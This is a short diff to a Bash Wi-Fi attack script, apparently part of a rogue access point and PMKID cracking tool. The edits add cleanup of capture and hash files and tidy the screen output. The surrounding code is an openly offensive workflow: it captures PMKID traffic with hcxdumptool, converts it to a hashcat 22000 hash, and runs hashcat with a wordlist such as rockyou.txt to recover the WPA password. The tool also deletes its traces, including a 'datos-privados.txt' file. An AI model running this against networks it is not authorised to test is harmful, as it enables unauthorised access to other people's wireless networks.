@@ -23,6 +23,7 @@ ctrl_c() {
 	ifconfig $tar up > /dev/null 2>&1
 	tput cnorm
 	sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
+	sudo rm Capture.pcapng hash.hc22000 2>/dev/null
 	rm -r iface 2>/dev/null
 	sudo rm Handshake* 2>/dev/null
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
@@ -290,16 +291,17 @@ pkmid_ataque() {
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
     echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
 	hcxpcapngtool -o hash.hc22000 Capture.pcapng > /dev/null 2>&1
+	sudo rm Capture.pcapng
 	sleep 1
 	$cleancolor
 	test -f hash.hc22000
 	if [ "$(echo $?)" -eq 0 ]; then
-		echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
+		clear; echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
 		sleep 1
 		tput cnorm
 		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
-		tput civis; echo -e "\n${yellowColour}[*] Preparing the package for brute force..."
+		tput civis
 		hashcat -m 22000 hash.hc22000 $dicc1
 	else 
 		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
